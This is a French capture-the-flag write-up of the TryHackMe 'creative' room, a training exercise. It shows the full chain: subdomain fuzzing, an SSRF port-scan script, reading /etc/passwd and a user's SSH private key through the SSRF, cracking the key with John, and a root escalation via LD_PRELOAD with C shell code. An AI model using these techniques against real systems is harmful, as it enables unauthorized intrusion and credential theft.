# Room
Room **creative**

Une VM sympathique, mais pas si facile que ca finalement je trouve.

# Enumeration
Je vous montre ici que ce qui à apporter une réponse utile.

## Nmap:
```
WARNING: Running Nmap setuid, as you are doing, is a major security risk.

# Nmap 7.94SVN scan initiated Thu Apr 25 06:09:01 2024 as: nmap -sC -sV -p- -o nmap.txt 10.10.195.49
Nmap scan report for creative.thm (10.10.195.49)
Host is up (0.037s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA)
|   256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA)
|_  256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Creative Studio | Free Bootstrap 4.3.x template
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 25 06:11:00 2024 -- 1 IP address (1 host up) scanned in 118.58 seconds
```
## Wfuzz
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/creative]
└─$ wfuzz -c -u http://creative.thm/ -H "Host: FUZZ.creative.thm" -w /home/kali/Wordlist/subdomains-top1million-5000.txt --hc 301
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://creative.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                             
=====================================================================

000000033:   200        19 L     66 W       591 Ch      "beta"                                                                                                              

Total time: 18.32216
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 272.2931
```

# Searching
Le site **http://creative.thm/** n'apporte rien d'utile.

Par contre, **http://beta.creative.thm/** pointe vers un tester d'url. Quand on met un site, il affiche le code sinon il écris **Dead**.

Je test **http://localhost** il affiche le site **http://creative.thm**

J'ouvre un serveur web local sur ma kali
```
sudo python3 -m http.server 80
```
Le site requête bien mon webserv. Je tente d'upload un shell mais cela ne fonctionne pas. Le code n'est pas interpreter.

Après m'être manger quelques murs concernant mes shells et autre injection de cmd, je me souvient qu'il m'est déjà arriver de tomber sur des serveurs locaux avec des ports non visible depuis l'ext.

On va test ca avec un petit script (j'ai test avec Burp Suite, mais comme j'ai une version Community, l'intruder est extrèmement lent....)
```sh
#!/bin/bash

for port in $(seq 1 65535); do
        url="http://localhost:${port}"
        resp=$(curl -s -X POST "http://beta.creative.thm/" -d "url=${url}")
        if [ "$resp" = "<p> Dead </p>" ]; then
                echo "Port ${port} is closed"
        else
                echo "Port ${port} respond !"
        fi
done
```
Il trouve un port, le port 1337 répond ! Il s'agit d'une page **Directory list** avec le contenu de **/**

On peux voir **/etc/passwd**
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/creative]
└─$ curl -X POST "http://beta.creative.thm" -d "url=http://localhost:1337/etc/passwd"
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
saad:x:1000:1000:saad:/home/saad:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
```
# Acces !
Après un peu de fouinage, je trouve la clé ssh de l'utilisateur **saad**
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/creative]
└─$ curl -X POST "http://beta.creative.thm" -d "url=http://localhost:1337/home/saad/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABA1J8+LAd
rb49YHdSMzgX80AAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDBbWMPTToe
wBK40FcBuzcLlzjLtfa21TgQxhjBYMPUvwzbgiGpJYEd6sXKeh9FXGYcgXCduq3rz/PSCs
48K+nYJ6Snob95PhfKfFL3x8JMc3sABvU87QxrJQ3PFsYmEzd38tmTiMQkn08Wf7g13MJ6
[...REDACTED...]
Zs0fwcKpS7h0GzikbIAcrln7ozSgjMzYawbQzEyjjR2QFySMWLGHAW4N7eZ6VfP3dBJxcs
fq4rvw54iukm24T9qAnMXuj1+9joNomiScStTV98RmVy8WMs6WW4r0f7ynhN/S/LYHya+6
D2DK4fRX8v5bY9MAsuqlBIUYH0AVUieyDBnP9QsGNnlIm8TS9UuT/gv/6+sWRpg7H5jkNz
69XRxDuLKV5jVElkEAn/B3bkpkAAcfSfXJphgtYsYbrgchSGtxWMX7FurkWbd0l0WyX//E
8OWhSwGmtO24YBhqQ47nGhDa8ceAJbr0uOIVm+Klfro2D7bPX0Wm2LC65Z6OQGvhrEbQwP
nYcg+D3hFL9ZB4GfAZzwbLAP6EYJ+Tq6I/eiJ5LKs6Q32jMfITUy3wcEPkneMwdOkd35Od
Fcm9ZL3fa5FhAEdRXJrF8Oe5ZkHsj3nXLYnc2Z2Aqjl6TpMRubuu+qnaOdCnAGu1ghqQlS
ksrXEYjaMdndnvxBZ0zi9T+ywag=
-----END OPENSSH PRIVATE KEY-----
```

Je la récupère et la crack avec John:
```                                                                                                                                                                                 
┌──(kali㉿kali)-[~/Challenge/TryHackMe/creative]
└─$ ssh2john id_rsa > hashrsa                                                                   
                                                                                                                                                                                                                                                                                                                                                        
┌──(kali㉿kali)-[~/Challenge/TryHackMe/creative]
└─$ john --wordlist=/home/kali/Wordlist/rockyou.txt hashrsa 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[...REDACTED...]        (id_rsa)     
1g 0:00:00:10 DONE (2024-04-26 06:44) 0.09960g/s 95.61p/s 95.61c/s 95.61C/s hawaii..sandy
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Challenge/TryHackMe/creative]
└─$ 

```
J'ai le mdp! Nous voila avec une connexion SSH sur le serveur
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/creative]
└─$ ssh saad@10.10.16.209 -i id_rsa
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 26 Apr 2024 10:51:53 AM UTC

  System load:  0.97              Processes:             123
  Usage of /:   57.3% of 8.02GB   Users logged in:       0
  Memory usage: 26%               IPv4 address for eth0: 10.10.16.209
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

58 updates can be applied immediately.
33 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Nov  6 07:56:40 2023 from 192.168.8.102
saad@m4lware:~$
```
J'en profile pour prendre le 1er flag dans **user.txt**

# Privesc to root !
Dans l'historique, on retrouve le mot de passe de **saad**
```
echo "saad:[...REDACTED...]" > creds.txt
```
On va pouvoir voir ce qu'il peux faire avec sudo par exemple
```
saad@m4lware:/tmp$ sudo -l 
[sudo] password for saad: 
Matching Defaults entries for saad on m4lware:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User saad may run the following commands on m4lware:
    (root) /usr/bin/ping
```
Il peux lancer un ping en tant que root, mais ce qui nous interesse ici, c'est **env_keep+=LD_PRELOAD**

Plus d'information concernant cette exploit [ici](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)

Nous allons pouvoir en profiter pour devenir root.

On va commencer par ce créer un shell:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");
  setgid(0);
  setuid(0);
  system("/bin/bash");
}
```
Ensuite on le compile:
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
et plus qu'a l'executer :
```
saad@m4lware:/tmp$ sudo LD_PRELOAD=/tmp/shell.so ping 
root@m4lware:/tmp#
```
Et nous voila root :)
